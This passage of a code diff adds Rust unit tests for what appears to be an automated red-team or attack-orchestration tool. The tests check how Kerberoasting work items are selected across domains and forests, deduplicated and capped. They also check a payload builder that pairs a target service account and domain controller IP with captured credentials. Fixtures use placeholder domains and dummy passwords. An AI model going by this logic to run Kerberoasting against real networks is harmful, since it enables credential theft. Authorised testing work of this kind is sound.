+            .push(make_cred("alice", "Pw!", "contoso.local"));
+        let work = select_kerberoast_vuln_work(&s, 10);
+        assert_eq!(work.len(), 1);
+        assert_eq!(work[0].target_domain, "child.contoso.local");
+        assert_eq!(work[0].credential.domain, "contoso.local");
+    }
+
+    #[test]
+    fn select_kerberoast_vuln_silent_drops_when_no_forest_cred() {
+        // Cross-forest vuln, no same-forest cred — drops with no work
+        // item. The dispatch loop logs once per tick at debug level.
+        let mut s = StateInner::new("op-test".into());
+        s.discovered_vulnerabilities.insert(
+            "v-spn-cross".into(),
+            make_kerberoastable_vuln("v-spn-cross", "sql_svc", "fabrikam.local"),
+        );
+        s.domain_controllers
+            .insert("fabrikam.local".into(), "192.168.58.20".into());
+        s.credentials
+            .push(make_cred("carol", "P@ssw0rd!", "contoso.local"));
+        let work = select_kerberoast_vuln_work(&s, 10);
+        assert!(work.is_empty());
+    }
+
+    #[test]
+    fn select_kerberoast_vuln_skips_already_dispatched() {
+        let mut s = StateInner::new("op-test".into());
+        s.discovered_vulnerabilities.insert(
+            "v-spn-1".into(),
+            make_kerberoastable_vuln("v-spn-1", "sql_svc", "fabrikam.local"),
+        );
+        s.domain_controllers
+            .insert("fabrikam.local".into(), "192.168.58.20".into());
+        s.credentials
+            .push(make_cred("carol", "P@ssw0rd!", "fabrikam.local"));
+        s.mark_processed(DEDUP_CRACK_REQUESTS, "krb_vuln:v-spn-1".into());
+        assert!(select_kerberoast_vuln_work(&s, 10).is_empty());
+    }
+
+    #[test]
+    fn select_kerberoast_vuln_skips_exploited() {
+        let mut s = StateInner::new("op-test".into());
+        s.discovered_vulnerabilities.insert(
+            "v-spn-2".into(),
+            make_kerberoastable_vuln("v-spn-2", "sql_svc", "fabrikam.local"),
+        );
+        s.exploited_vulnerabilities.insert("v-spn-2".into());
+        s.domain_controllers
+            .insert("fabrikam.local".into(), "192.168.58.20".into());
+        s.credentials
+            .push(make_cred("carol", "P@ssw0rd!", "fabrikam.local"));
+        assert!(select_kerberoast_vuln_work(&s, 10).is_empty());
+    }
+
+    #[test]
+    fn select_kerberoast_vuln_caps_at_max_items() {
+        let mut s = StateInner::new("op-test".into());
+        for i in 0..5 {
+            let id = format!("v-spn-{i}");
+            s.discovered_vulnerabilities.insert(
+                id.clone(),
+                make_kerberoastable_vuln(&id, &format!("svc_{i}"), "fabrikam.local"),
+            );
+        }
+        s.domain_controllers
+            .insert("fabrikam.local".into(), "192.168.58.20".into());
+        s.credentials
+            .push(make_cred("carol", "P@ssw0rd!", "fabrikam.local"));
+        assert_eq!(select_kerberoast_vuln_work(&s, 2).len(), 2);
+        assert_eq!(select_kerberoast_vuln_work(&s, 10).len(), 5);
+    }
+
+    #[test]
+    fn build_vuln_kerberoast_payload_carries_target_user_and_credential() {
+        let cred = make_cred("carol", "P@ssw0rd!", "fabrikam.local");
+        let p = build_vuln_kerberoast_payload("fabrikam.local", "192.168.58.20", &cred, "sql_svc");
+        assert_eq!(p["technique"], "kerberoast");
+        assert_eq!(p["target_ip"], "192.168.58.20");
+        assert_eq!(p["domain"], "fabrikam.local");
+        assert_eq!(p["target_user"], "sql_svc");
+        assert_eq!(p["credential"]["username"], "carol");
+        assert_eq!(p["credential"]["password"], "P@ssw0rd!");
+        assert_eq!(p["credential"]["domain"], "fabrikam.local");
+        assert_eq!(p["reason"], "kerberoastable_account_vuln");
     }
 }
